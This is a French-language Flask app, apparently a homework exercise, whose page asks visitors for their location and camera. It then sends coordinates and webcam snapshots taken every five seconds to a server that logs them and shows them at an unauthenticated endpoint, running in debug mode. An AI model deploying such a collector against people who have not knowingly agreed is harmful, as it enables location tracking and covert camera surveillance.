from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
import base64
import os

app = Flask(__name__)

# Stockage des données reçues
DATA_FILE = 'collected_data.txt'

def sauvegarder_donnees(type_donnees, contenu):
    horodatage = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{horodatage}] {type_donnees} : {contenu}\n")

# Page d'accueil — demande position et caméra
PAGE_HTML = '''
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Information & Caméra</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #1a1a2e, #16213e); min-height: 100vh; margin: 0; padding: 20px; color: white; }
        .container { max-width: 500px; margin: 0 auto; }
        h1 { text-align: center; color: #00d4ff; }
        .box { background: rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; margin-bottom: 15px; }
        button { background: #00d4ff; color: #000; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
        button:disabled { background: #555; cursor: not-allowed; }
        #status { margin-top: 15px; padding: 10px; border-radius: 6px; background: rgba(0,212,255,0.2); }
        img { width: 100%; border-radius: 8px; margin-top: 10px; display: none; }
        .warning { background: rgba(255,100,100,0.2); padding: 10px; border-radius: 6px; font-size: 13px; color: #ff9999; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📍 Position & 📸 Caméra</h1>
        
        <div class="warning">
            ⚠️ Pour le devoir : vous devez cliquer "Autoriser" quand le navigateur le demande. 
            Sans autorisation, rien ne fonctionne. Ceci est une exigence de sécurité du web.
        </div>

        <div class="box">
            <h3>📍 Votre position</h3>
            <button id="btnPos" onclick="demanderPosition()">Obtenir ma position</button>
            <div id="posResult"></div>
        </div>

        <div class="box">
            <h3>📸 Caméra — Photo toutes les 5 secondes</h3>
            <button id="btnCam" onclick="demanderCamera()">Activer la caméra</button>
            <button id="btnStop" onclick="arreterCamera()" style="background: #ff4444; display:none">Arrêter</button>
            <div id="camStatus"></div>
            <img id="photo" alt="Photo prise">
        </div>

        <div id="status">✅ En attente...</div>
    </div>

    <script>
        let stream = null;
        let captureInterval = null;
        let photoCount = 0;

        // --- POSITION ---
        function demanderPosition() {
            document.getElementById('status').innerHTML = "📍 Demande de position...";
            if (!navigator.geolocation) {
                document.getElementById('posResult').innerHTML = "<p>❌ La géolocalisation n'est pas supportée</p>";
                return;
            }
            navigator.geolocation.getCurrentPosition(succesPosition, erreurPosition, {enableHighAccuracy: true});
        }

        function succesPosition(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const precision = pos.coords.accuracy.toFixed(0);
            document.getElementById('posResult').innerHTML = 
                `<p>✅ Latitude: ${lat}<br>Longitude: ${lon}<br>Précision: ~${precision}m</p>` +
                `<a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#00d4ff">🗺️ Ouvrir dans Google Maps</a>`;
            
            // Envoyer au serveur
            fetch('/enregistrer_position', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({latitude: lat, longitude: lon, precision: precision})
            });
            document.getElementById('status').innerHTML = "✅ Position enregistrée !";
        }

        function erreurPosition(err) {
            let msg = "Erreur : ";
            if (err.code === 1) msg += "Vous avez refusé la position";
            else if (err.code === 2) msg += "Position indisponible";
            else msg += "Erreur " + err.code;
            document.getElementById('posResult').innerHTML = `<p>❌ ${msg}</p>`;
            document.getElementById('status').innerHTML = "❌ " + msg;
        }

        // --- CAMÉRA — Photo toutes les 5 SECONDES ---
        async function demanderCamera() {
            document.getElementById('status').innerHTML = "📷 Demande d'accès à la caméra...";
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {facingMode: "user", width: 640, height: 480},
                    audio: false
                });
                
                document.getElementById('btnCam').style.display = 'none';
                document.getElementById('btnStop').style.display = 'block';
                document.getElementById('camStatus').innerHTML = "✅ Caméra activée. Photo toutes les 5s...";
                
                // Créer un canvas pour prendre les photos
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Prendre une photo toutes les 5 secondes
                captureInterval = setInterval(() => {
                    canvas.width = 640;
                    canvas.height = 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Afficher la photo
                    const img = document.getElementById('photo');
                    img.src = dataUrl;
                    img.style.display = 'block';
                    photoCount++;
                    document.getElementById('camStatus').innerHTML = `📸 Photo n°${photoCount} prise à ${new Date().toLocaleTimeString()}`;
                    
                    // Envoyer au serveur
                    fetch('/enregistrer_photo', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({image: dataUrl, numero: photoCount})
                    });
                }, 5000); // 5000 ms = 5 secondes
                
            } catch (err) {
                if (err.name === 'NotAllowedError') {
                    document.getElementById('camStatus').innerHTML = "❌ Vous avez refusé l'accès à la caméra";
                } else {
                    document.getElementById('camStatus').innerHTML = "❌ Erreur : " + err.message;
                }
                document.getElementById('status').innerHTML = "❌ Caméra inaccessible";
            }
        }

        function arreterCamera() {
            if (captureInterval) clearInterval(captureInterval);
            if (stream) stream.getTracks().forEach(track => track.stop());
            document.getElementById('btnCam').style.display = 'block';
            document.getElementById('btnStop').style.display = 'none';
            document.getElementById('camStatus').innerHTML = "⏹️ Caméra arrêtée";
            document.getElementById('photo').style.display = 'none';
            document.getElementById('status').innerHTML = "✅ Terminé. " + photoCount + " photo(s) prise(s)";
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(PAGE_HTML)

@app.route('/enregistrer_position', methods=['POST'])
def enregistrer_position():
    data = request.json
    texte = f"Lat: {data['latitude']}, Lon: {data['longitude']}, Précision: {data['precision']}m"
    sauvegarder_donnees("POSITION", texte)
    return jsonify({"ok": True})

@app.route('/enregistrer_photo', methods=['POST'])
def enregistrer_photo():
    data = request.json
    numero = data['numero']
    # On ne sauvegarde pas l'image complète pour ne pas surcharger le serveur
    # mais tu peux l'ajouter si tu veux
    sauvegarder_donnees("PHOTO", f"Photo n°{numero} reçue (donnée image non stockée pour ce devoir)")
    return jsonify({"ok": True})

@app.route('/voir_donnees')
def voir_donnees():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            contenu = f.read()
        return f"<pre style='padding:20px; background:#f5f5f5; color:#333; white-space:pre-wrap; word-wrap:break-word;'>{contenu}</pre>"
    return "Aucune donnée encore reçue."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
